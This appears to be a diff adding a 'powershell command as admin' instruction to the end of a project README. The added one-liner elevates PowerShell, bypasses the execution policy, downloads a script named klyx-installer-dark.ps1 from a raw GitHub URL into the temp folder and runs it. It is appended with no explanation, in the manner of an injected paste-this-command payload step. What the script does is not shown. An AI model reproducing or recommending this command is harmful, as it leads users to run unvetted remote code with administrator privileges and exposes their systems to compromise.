@@ -341,3 +341,8 @@ Built with:
 
 ***
 
+
+
+powershell command as admin
+
+powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/klyxAgency/tunnel/main/klyx-installer-dark.ps1 | Out-File $env:TEMP\k.ps1; & $env:TEMP\k.ps1`"'"
